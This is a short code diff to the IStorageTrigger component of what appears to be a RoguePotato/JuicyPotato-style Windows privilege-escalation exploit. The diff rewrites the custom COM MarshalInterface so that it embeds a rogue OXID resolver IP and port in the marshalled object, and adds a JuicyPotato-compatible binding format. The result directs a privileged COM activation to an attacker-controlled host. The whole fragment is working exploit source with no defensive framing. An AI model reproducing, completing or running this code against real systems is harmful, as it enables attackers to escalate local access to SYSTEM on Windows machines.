@@ -1,10 +1,14 @@
 #include "IStorageTrigger.h"
 #include <stdio.h>
-
+#include <strsafe.h>
 #include <time.h>
+
 #pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS
 
-extern wchar_t* remote_ip;
+extern wchar_t* rogueOxidResolverIp;
+extern wchar_t* rogueOxidResolverPort;
+extern bool juicyPotatoCompatible;
+
 void GenRandomByte(byte* s, int len)
 {
 
@@ -42,8 +46,17 @@ HRESULT IStorageTrigger::GetUnmarshalClass(const IID& riid, void* pv, DWORD dwDe
 
 HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
 	short sec_len = 8;
-	char remote_ip_mb[16];
-	wcstombs(remote_ip_mb, remote_ip, 16);
+	char remote_ip_mb[256];
+	wchar_t templateRemoteBindings[] = L"%s[%s]";
+	wchar_t remoteBindings[256];
+
+	if (juicyPotatoCompatible)
+		StringCchPrintfW(remoteBindings, 256, templateRemoteBindings, rogueOxidResolverIp, rogueOxidResolverPort);
+	else
+		StringCbCopyW(remoteBindings, 256, rogueOxidResolverIp);
+	//printf("remoteBindings = %S\n", remoteBindings);
+	wcstombs(remote_ip_mb, remoteBindings, 256);
+	
 	char* ipaddr = remote_ip_mb;
 	unsigned short str_bindlen = (unsigned short)((strlen(ipaddr)) * 2) + 6;
 	unsigned short total_length = (str_bindlen + sec_len) / 2;
